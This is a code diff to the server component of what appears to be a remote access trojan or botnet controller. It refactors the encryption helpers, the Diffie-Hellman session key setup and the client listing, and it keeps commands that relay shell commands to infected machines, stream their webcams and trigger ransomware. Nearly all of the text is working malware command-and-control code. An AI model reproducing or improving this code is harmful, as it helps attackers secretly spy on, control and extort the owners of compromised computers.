@@ -117,14 +117,14 @@ class Server(threading.Thread):
 	    'sendall'	    :   self.sendall_clients,
             'settings'      :   self.display_settings,
             'session'       :   self.get_current_session,
-            'webcam'        :   self.webcam_client,
+            'webcam'        :   self.webcam_client
             }
         self._text_color    = getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','MAGENTA']))
         self._text_style    = colorama.Style.DIM
         self._prompt_color  = colorama.Fore.RESET
         self._prompt_style  = colorama.Style.BRIGHT
         self.name           = time.time()
-        self.database['session_key'] = self._session_key()
+        self.database['session_key'] = self.session_key()
         self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind(('0.0.0.0', port))
@@ -133,6 +133,9 @@ class Server(threading.Thread):
 
     def _prompt(self, data):
         return raw_input(self._prompt_color + self._prompt_style + '\n' + data + self._text_color + self._text_style)
+
+    def _pad(self, s, block_size, padding=chr(0)):
+        return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
     
     def _error(self, data):
         if self.current_client:
@@ -176,33 +179,28 @@ class Server(threading.Thread):
             self.shell.set()
             return self.run()
 
-    def _get_status(self, c):
-        data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
+    def _get_status(self, timestamp):
+        try:
+            c = time.time() - float(timestamp)
+            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                   '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                   '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
-        return ', '.join([i for i in data if i])
-
-    def _pad(self, s, block_size, padding=chr(0)):
-        return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
+            return ', '.join([i for i in data if i])
+        except Exception as e:
+            return "{} error: {}".format(self._get_status.func_name, str(e))
 
     def _encrypt_aes(self, data, key):
-        try:
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
-            ciphertext, tag = cipher.encrypt_and_digest(data)
-            output = b''.join((cipher.nonce, tag, ciphertext))
-            return base64.b64encode(output)
-        except Exception as e:
-            self._error("{} error: {}".format(self._encrypt_aes.func_name, str(e)))
+        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        output = b''.join((cipher.nonce, tag, ciphertext))
+        return base64.b64encode(output)
 
     def _decrypt_aes(self, data, key):
-        try:
-            data = cStringIO.StringIO(base64.b64decode(data))
-            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
-            return cipher.decrypt_and_verify(ciphertext, tag)
-        except Exception as e:
-            self._error("{} error: {}".format(self._decrypt_aes.func_name, str(e)))
+        data = cStringIO.StringIO(base64.b64decode(data))
+        nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
+        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag)
 
     def _encrypt_server(self, plaintext, key):
         text        = self._pad(plaintext, Crypto.Cipher.AES.block_size, chr(0))
@@ -220,18 +218,22 @@ class Server(threading.Thread):
         calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
         print('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
         return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(chr(0))
-
-    # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631 
-    def _session_key(self):
+ 
+    def session_key(self):
+        """
+        Diffie-Hellman transaction-less key exchange - RFC 2631
+            modulus:    2048-bit prime MOPD group 14 - RFC 3526      
+            generator:  2
+        """
         try:
-            # RFC 3526 MOPD group 14 (2048 bit strong prime)
-            p   = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            g   = 2            
-            a   = Crypto.Util.number.bytes_to_long(os.urandom(32))            
-            Ax  = pow(g, a, p)  # g ^ A mod P 
-            Bx  = long(requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(Ax).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content)
-            k   = pow(Bx, a, p) # Bx ^ A mod P 
-            return Crypto.Hash.SHA256.new(bytes(k).strip('L')).hexdigest()
+            modulus             = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            generator           = 2            
+            private_key         = Crypto.Util.number.bytes_to_long(os.urandom(32))            
+            public_key_local    = pow(generator, private_key, modulus)
+            public_key_remote   = long(requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(public_key_local).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content)
+            shared_secret       = pow(public_key_remote, private_key, modulus)  
+            session_key         = Crypto.Hash.SHA256.new(bytes(shared_secret).strip('L')).hexdigest()
+            return session_key
         except Exception as e:
             return self._error("{} returned error: {}".format(self._session_key.func_name, str(e)))
 
@@ -258,6 +260,8 @@ class Server(threading.Thread):
             self._return()
         try:
             return self._decrypt_aes(data, client.session_key)
+        except ValueError:
+            self._error("{} error: authentication failed - network communication may be compromised".format(self.decrypt.func_name))
         except Exception as e:
             self._error("{} error: {}".format(self.decrypt.func_name, str(e)))
 
@@ -380,9 +384,9 @@ class Server(threading.Thread):
     def list_clients(self):
         lock = self.lock if not self.current_client else self.current_client.lock
         with lock:
-            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
+            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
             for k, v in self.clients.items():
-                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
+                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v.address[0]))
             print('\n')
         self._return()
           
@@ -391,6 +395,7 @@ class Server(threading.Thread):
         for client in self.get_clients():
             client.shell.set()
             self.send_client('standby', client.name)
+        print(colorama.Fore.RESET + colorama.Style.NORMAL)
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name is 'nt' else "kill -9 {}".format(os.getpid())).read()
         sys.exit(0)
 
@@ -507,9 +512,10 @@ class Server(threading.Thread):
                 self.send_client("webcam %s" % args, client.name)
                 task    = self.recv_client(client.name)
                 result  = task.get('result')
-            return result
+            self._print(result)
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
+        self._return()
 
     def ransom_client(self, args=None):
         if self.current_client:
@@ -756,7 +762,9 @@ class ClientHandler(threading.Thread):
                         prompt  = task.get('result') % int(self.name)
                         command = self._prompt(prompt)
                         cmd, _, action  = command.partition(' ')
-                        if cmd in threads['server'].commands and cmd != 'help':
+                        if cmd in ('\n', ' '):
+                            continue
+                        elif cmd in threads['server'].commands and cmd != 'help':
                             self.prompt = task
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
                             if result:
@@ -765,17 +773,18 @@ class ClientHandler(threading.Thread):
                             continue
                         else:
                             threads['server'].send_client(command, self.name)
-                    elif task.get('result') and 'prompt' not in task.get('command'):
-                        if threads['server'].current_client.name == self.name:
+                    else:
+                        if task.get('result') and task.get('result') != 'None':
                             threads['server']._print(task.get('result'))
-                        threads['server'].save_task_results(task)
-                    elif threads['server'].exit_status:
+                            threads['server'].save_task_results(task)
+                    if threads['server'].exit_status:
                         break
                     self.prompt = None
             except Exception as e:
                 self._error(str(e))
-                time.sleep(5)
-                continue
+                break
+        threads['server']._return()
+
 
 if __name__ == '__main__':
     colorama.init()
